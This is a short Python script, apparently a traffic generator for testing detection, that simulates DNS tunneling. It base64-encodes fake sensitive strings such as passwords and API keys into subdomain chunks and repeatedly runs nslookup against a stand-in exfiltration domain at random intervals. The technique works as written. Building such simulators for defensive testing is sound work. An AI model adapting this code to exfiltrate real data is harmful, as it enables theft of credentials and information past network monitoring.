#!/usr/bin/env python3
"""
DNS Tunneling Simulator
Simulates data exfiltration via DNS queries
"""

import time
import subprocess
import random
import base64

def run_dns_tunnel(is_running):
    """Simulate DNS tunneling for data exfiltration"""
    print("Starting DNS Tunneling simulation...")

    # Simulated sensitive data
    sensitive_data = [
        "password123",
        "admin credentials",
        "database backup",
        "api keys and tokens",
        "user personal information",
    ]

    malicious_domain = "data-exfil-server.tk"

    while is_running():
        try:
            # Encode data in DNS query
            data = random.choice(sensitive_data)
            encoded = base64.b64encode(data.encode()).decode().replace('=', '')

            # Create long DNS query (suspicious pattern)
            # Split data into chunks and create subdomain
            chunk_size = 8
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            subdomain = '.'.join(chunks)

            dns_query = f"{subdomain}.{malicious_domain}"

            print(f"[DNS] Tunneling data via: {dns_query}")

            # Perform DNS query (will fail but generates traffic)
            try:
                subprocess.run(
                    ["nslookup", dns_query],
                    timeout=5,
                    capture_output=True
                )
            except:
                pass

            # Random delay between exfiltration attempts
            time.sleep(random.uniform(30, 90))

        except Exception as e:
            print(f"[DNS] Error: {e}")
            time.sleep(10)

    print("DNS Tunneling simulation stopped")
